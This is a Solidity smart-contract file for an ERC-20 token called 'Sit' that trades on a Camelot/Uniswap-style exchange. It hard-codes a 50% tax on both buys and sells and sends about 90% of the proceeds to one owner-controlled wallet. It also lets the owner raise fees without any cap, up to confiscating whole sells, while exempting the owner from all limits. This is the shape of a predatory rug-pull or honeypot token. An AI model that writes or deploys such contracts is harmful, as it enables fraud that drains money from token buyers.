// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.10;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface ICamelotFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

    function owner() external view returns (address);
    function feePercentOwner() external view returns (address);
    function setStableOwner() external view returns (address);
    function feeTo() external view returns (address);

    function ownerFeeShare() external view returns (uint256);
    function referrersFeeShare(address) external view returns (uint256);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function feeInfo() external view returns (uint _ownerFeeShare, address _feeTo);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface ICamelotRouter is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        address referrer,
        uint deadline
    ) external;


}

contract Erc20Token is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee;

    address payable public Wallet_Marketing = payable(0xa57feDc2641d1ce0329046fde51B288476C2BC7a);
    address payable public Wallet_Dev = payable(0xa57feDc2641d1ce0329046fde51B288476C2BC7a);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 18;
    uint256 private _tTotal = 420000000000000 * (10 ** _decimals);
    string private constant _name = "Sit";
    string private constant _symbol = "Sit";

    uint8 private txCount = 0;
    uint8 public swapTrigger = 2;

    uint256 public _Tax_On_Buy = 50;
    uint256 public _Tax_On_Sell = 50;

    uint256 public Percent_Marketing = 90;
    uint256 public Percent_Dev = 0;
    uint256 public Percent_Burn = 1;
    uint256 public Percent_AutoLP = 9;

    uint256 public _maxWalletToken = _tTotal * 2 / 100;
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    ICamelotFactory private factory = ICamelotFactory(0x6EcCab422D763aC031210895C81787E87B43A652);

    ICamelotRouter public uniswapV2Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);

    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;

    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity

    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {

        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;

//        uniswapV2Pair = factory.createPair(uniswapV2Router.WETH(), address(this));

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Marketing] = true;
        _isExcludedFromFee[Wallet_Burn] = true;

        emit Transfer(address(0), owner(), _tTotal);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns(uint256) {
        return (_tTotal);
    }



    function _approve(address theOwner, address theSpender, uint256 amount) private {

        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        if (to != owner() &&
        to != Wallet_Burn &&
        to != address(this) &&
        to != uniswapV2Pair &&
            from != owner()){
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"Over wallet limit.");}

        if (from != owner())
            require(amount <= _maxTxAmount, "Over transaction limit.");


        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            txCount >= swapTrigger &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        )
        {

            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            txCount = 0;
            swapAndLiquify(contractTokenBalance);
        }

        bool takeFee = true;
        bool isBuy;
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        } else {

            if(from == uniswapV2Pair){
                isBuy = true;
            }

            txCount++;

        }

        _tokenTransfer(from, to, amount, takeFee, isBuy);

    }

    function sendToWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {

        uint256 tokens_to_Burn = contractTokenBalance * Percent_Burn / 100;
        _tTotal = _tTotal - tokens_to_Burn;
        _tOwned[Wallet_Burn] = _tOwned[Wallet_Burn] + tokens_to_Burn;
        _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn;

        uint256 tokens_to_M = contractTokenBalance * Percent_Marketing / 100;
        uint256 tokens_to_D = contractTokenBalance * Percent_Dev / 100;
        uint256 tokens_to_LP_Half = contractTokenBalance * Percent_AutoLP / 200;

        uint256 balanceBeforeSwap = address(this).balance;
        swapTokensForWETH(tokens_to_LP_Half + tokens_to_M + tokens_to_D);
        uint256 WETH_Total = address(this).balance - balanceBeforeSwap;

        uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev);
        uint256 WETH_M = WETH_Total * split_M / 100;

        uint256 split_D = Percent_Dev * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Dev);
        uint256 WETH_D = WETH_Total * split_D / 100;


        addLiquidity(tokens_to_LP_Half, (WETH_Total - WETH_M - WETH_D));
        emit SwapAndLiquify(tokens_to_LP_Half, (WETH_Total - WETH_M - WETH_D), tokens_to_LP_Half);

        sendToWallet(Wallet_Marketing, WETH_M);

        WETH_Total = address(this).balance;
        sendToWallet(Wallet_Dev, WETH_Total);

    }

    function swapTokensForWETH(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            address(0),
            block.timestamp
        );
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFee[account] = excluded;
    }

    function updateFees(
        uint256 _buyFee,
        uint256 _sellFee
    ) external onlyOwner {
        _Tax_On_Buy = _buyFee;
        _Tax_On_Sell = _sellFee;
    }

    function updateTrigger(
        uint8 trigger
    ) external onlyOwner {
        swapTrigger = trigger;
    }

    function initializePair() public onlyOwner {
        uniswapV2Pair = factory.createPair(uniswapV2Router.WETH(), address(this));
    }

    function addLiquidity(uint256 tokenAmount, uint256 WETHAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: WETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            Wallet_Burn,
            block.timestamp
        );
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {


        if(!takeFee){

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            emit Transfer(sender, recipient, tAmount);

            if(recipient == Wallet_Burn)
                _tTotal = _tTotal-tAmount;

        } else if (isBuy){

            uint256 buyFEE = tAmount*_Tax_On_Buy/100;
            uint256 tTransferAmount = tAmount-buyFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+buyFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == Wallet_Burn)
                _tTotal = _tTotal-tTransferAmount;

        } else {

            uint256 sellFEE = tAmount*_Tax_On_Sell/100;
            uint256 tTransferAmount = tAmount-sellFEE;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+sellFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if(recipient == Wallet_Burn)
                _tTotal = _tTotal-tTransferAmount;


        }

    }


}